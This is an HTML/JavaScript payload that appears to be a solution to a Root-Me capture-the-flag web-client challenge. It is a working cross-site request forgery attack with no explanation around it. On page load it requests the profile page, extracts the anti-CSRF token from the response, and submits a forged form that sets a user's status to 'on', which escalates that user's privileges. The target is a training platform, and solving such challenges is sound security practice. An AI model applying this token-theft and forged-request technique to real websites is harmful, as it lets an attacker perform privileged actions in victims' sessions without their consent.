<script>
    var url = "http://challenge01.root-me.org/web-client/ch23/?action=profile";
    var xHttp = new XMLHttpRequest();
    function asd(){
        xHttp.onreadystatechange = resp;
        xHttp.open("POST", url);
        xHttp.send();
    }
    
    function resp(){
        var div = document.createElement("div");
        div.innerHTML = xHttp.responseText;
        var token = div.getElementById("token").value;
    
        var formData = new FormData();
        formData.append("username", "a");
        formData.append("status", "on");
        formData.append("token", token);
        var request = new XMLHttpRequest();
        request.open("POST", url);
        request.send(formData);
    }
</script>

<body onload="asd()">